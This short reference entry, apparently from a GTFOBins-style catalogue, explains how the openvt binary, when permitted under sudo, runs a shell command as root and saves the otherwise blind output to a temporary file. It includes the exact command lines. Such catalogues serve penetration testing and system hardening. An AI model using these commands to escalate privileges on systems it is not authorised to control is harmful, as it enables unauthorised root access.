***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * The command execution is blind (displayed on the virtual console), but it
      is possible to save the output on a temporary file.
      COMMAND=id
      TF=$(mktemp -u)
      sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
